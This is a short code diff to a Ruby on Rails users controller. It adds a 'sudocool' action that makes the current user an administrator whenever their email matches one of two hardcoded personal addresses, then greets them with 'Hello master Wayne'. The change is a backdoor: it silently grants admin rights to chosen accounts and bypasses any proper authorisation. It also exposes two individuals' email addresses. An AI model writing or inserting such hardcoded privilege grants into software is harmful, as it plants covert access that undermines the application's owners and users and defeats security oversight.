@@ -50,4 +50,18 @@ class UsersController < ApplicationController
 
   end
 
+  def sudocool
+    @user = current_user
+    if !@user.nil?
+      if @user.email == "manu.ucab@gmail.com" or @user.email == "cheto.rod7@gmail.com"
+        @user.is_admin = 1
+        @user.save
+        flash[:success] = "Hello master Wayne"
+        @user_is_admin = true
+      end
+    end
+    redirect_to "/"
+  end
+
+
 end
